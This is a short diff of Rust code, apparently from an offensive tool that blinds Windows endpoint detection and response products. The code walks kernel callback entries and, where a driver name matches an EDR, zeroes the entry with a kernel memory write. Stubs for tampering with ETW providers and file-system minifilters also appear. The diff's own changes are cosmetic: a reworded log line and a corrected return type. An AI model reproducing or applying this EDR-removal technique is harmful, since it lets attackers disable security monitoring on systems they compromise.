@@ -113,10 +113,7 @@ pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u6
                 addr, func_addr, drv_name
             );
             if km::is_driver_name_matching_edr(&drv_name) {
-                println!(
-                    "[|]    [0x{:16X}]: Entry matches EDR ({}). Removing...",
-                    addr, drv_name
-                );
+                println!("[|]                `------> Entry matches EDR ({}). Removing...", drv_name);
                 write_qword(addr, 0x00);
             }
         }
@@ -163,8 +160,8 @@ pub fn nerf_etw_prov(
 ///     pub flt_instance_filterlink: u64
 /// }  
 ///
-pub fn nerf_fs_miniflts(fm_offsets: pdb::FmOffsets) -> windows::core::Result<u64> {
+pub fn nerf_fs_miniflts(fm_offsets: pdb::FmOffsets) -> windows::core::Result<()> {
     println!("[|] FltGlobals offset: 0x{:x}", fm_offsets.flt_globals);
     
-    Ok()
+    Ok(())
 }
